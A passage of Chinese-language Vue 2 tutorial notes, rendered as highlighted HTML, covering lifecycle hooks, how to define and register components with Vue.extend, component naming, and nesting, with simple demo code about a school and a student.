class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span> <span class="attr">:x</span>=<span class="string">&quot;n&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-text</span>=<span class="string">&quot;n&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>当前的n值是：&#123;&#123;n&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;add&quot;</span>&gt;</span>点我n+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;bye&quot;</span>&gt;</span>点我销毁vm<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// template:`</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// &lt;div&gt;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// &lt;h2&gt;当前的n值是：&#123;&#123;n&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// &lt;button @click=&quot;add&quot;&gt;点我n+1&lt;/button&gt;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// &lt;/div&gt;</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// `,</span></span></span><br><span class="line"><span class="language-javascript"><span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="attr">n</span>:<span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">add</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;add&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">n</span>++</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">bye</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;bye&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.$destroy()</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">n</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;n变了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">beforeCreate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;beforeCreate&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;created&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">beforeMount</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;beforeMount&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mounted&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">beforeUpdate</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;beforeUpdate&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">updated</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;updated&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">beforeDestroy</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;beforeDestroy&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">destroyed</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;destroyed&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">&#125;,</span></span><br><span class="line"><span class="language-javascript">&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="总结生命周期"><a href="#总结生命周期" class="headerlink" title="总结生命周期"></a>总结生命周期</h3><ul><li>常用的生命周期钩子：<ul><li>1.mounted: 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等【初始化操作】。</li><li>2.beforeDestroy: 清除定时器、解绑自定义事件、取消订阅消息等【收尾工作】。</li></ul></li><li>关于销毁Vue实例<ul><li>1.销毁后借助Vue开发者工具看不到任何信息。 </li><li>2.销毁后自定义事件会失效，但原生DOM事件依然有效。 </li><li>3.一般不会在beforeDestroy操作数据，因为即便操作数据，也不会再触发更新流程了。</li></ul></li></ul><h2 id="非单文件组件"><a href="#非单文件组件" class="headerlink" title="非单文件组件"></a>非单文件组件</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><ul><li>Vue中使用组件的三大步骤：<ul><li>定义组件(创建组件)</li><li>注册组件</li><li>使用组件(写组件标签)</li></ul></li><li>如何定义一个组件？<ul><li>使用Vue.extend(options)创建，其中options和new Vue(options)时传入的那个options几乎一样，但也有点区别；</li><li>区别如下：<ul><li>.el不要写，为什么？ ——— 最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。</li><li>2.data必须写成函数，为什么？ ———— 避免组件被复用时，数据存在引用关系。</li><li>备注：使用template可以配置组件结构。</li></ul></li></ul></li><li>如何注册组件？<ul><li>1.局部注册：靠new Vue的时候传入components选项</li><li>2.全局注册：靠Vue.component(‘组件名’,组件)</li></ul></li><li>编写组件标签：<ul><li><school></school><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 第三步：编写组件标签 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- 第三步：编写组件标签 --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root2&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//第一步：创建school组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> school = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div class=&quot;demo&quot;&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校名称：&#123;&#123;schoolName&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;button @click=&quot;showName&quot;&gt;点我提示学校名&lt;/button&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// el:&#x27;#root&#x27;, //组件定义时，一定不要写el配置项，因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器。</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">schoolName</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">address</span>:<span class="string">&#x27;北京昌平&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">showName</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="variable language_">this</span>.<span class="property">schoolName</span>)</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//第一步：创建student组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> student = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学生姓名：&#123;&#123;studentName&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学生年龄：&#123;&#123;age&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">studentName</span>:<span class="string">&#x27;张三&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">age</span>:<span class="number">18</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//第一步：创建hello组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> hello = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;你好啊！&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>:<span class="string">&#x27;Tom&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//第二步：全局注册组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;hello&#x27;</span>,hello)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//创建vm</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">msg</span>:<span class="string">&#x27;你好啊！&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//第二步：注册组件（局部注册）</span></span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      school,</span></span><br><span class="line"><span class="language-javascript">      student</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root2&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul><li>1.关于组件名:<ul><li>一个单词组成：<ul><li>第一种写法(首字母小写)：school</li><li>第二种写法(首字母大写)：School</li></ul></li><li>多个单词组成：<ul><li>第一种写法(kebab-case命名)：my-school</li><li>第二种写法(CamelCase命名)：MySchool (需要Vue脚手架支持)</li></ul></li><li>备注：<ul><li>(1).组件名尽可能回避HTML中已有的元素名称，例如：h2、H2都不行。</li><li>(2).可以使用name配置项指定组件在开发者工具中呈现的名字。</li></ul></li></ul></li><li>2.关于组件标签:<ul><li>第一种写法：<school></school></li><li>第二种写法：<school/></li><li>备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。</li></ul></li><li>3.一个简写方式：<ul><li>const school = Vue.extend(options) 可简写为：const school = options<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;msg&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">//定义组件</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> s = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>:<span class="string">&#x27;atguigu&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">template</span>:<span class="string">`</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校名称：&#123;&#123;name&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;h2&gt;学校地址：&#123;&#123;address&#125;&#125;&lt;/h2&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">&lt;/div&gt;</span></span></span><br><span class="line"><span class="string"><span class="language-javascript">`</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">msg</span>:<span class="string">&#x27;欢迎学习Vue!&#x27;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">components</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">school</span>:s</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="组件的嵌套"><a href="#组件的嵌套" class="headerlink" title="组件的嵌套"></a>组件的嵌套</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//定义student组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">const student = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">name:&#x27;student&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生姓名：</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学生年龄：</span><span class="template-variable">&#123;&#123;<span class="name">age</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">name:&#x27;尚硅谷&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">age:18</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//定义school组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">const school = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">name:&#x27;school&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校名称：</span><span class="template-variable">&#123;&#123;<span class="name">name</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>学校地址：</span><span class="template-variable">&#123;&#123;<span class="name">address</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">name:&#x27;尚硅谷&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">address:&#x27;北京&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//注册组件（局部）</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">components:&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">student</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//定义hello组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">const hello = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">template:`<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><span class="template-variable">&#123;&#123;<span class="name">msg</span>&#125;&#125;</span><span class="language-xml"><span class="tag">&lt;/<span class="name">h1</span>&gt;</span>`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">data()&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">return &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">msg:&#x27;欢迎来到尚硅谷学习！&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//定义app组件</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">const app = Vue.extend(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">template:`</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">hello</span>&gt;</span><span class="tag">&lt;/<span class="name">hello</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">`,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">components:&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">school,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">hello</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//创建vm</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">new Vue(&#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">template:&#x27;<span class="tag">&lt;<span class="name">app</span>&gt;</span><span class="tag">&lt;/<span class="name">app</span>&gt;</span>&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">el:&#x27;#root&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">//注册组件（局部）</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">components:&#123;app&#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">&#125;)</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="VueComponent"><a href="#VueComponent" class="headerlink" title="VueComponent"></a>VueComponent</h3><ul><li>1.school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。</li><li>2.我们只需要写<school/>或<school></school>，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。</li><li>3.特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！</li><li>4.关于this指向：<ul><li>(1).组件配置中： data函数、methods中的函数、watch中的函数、computed中的函数 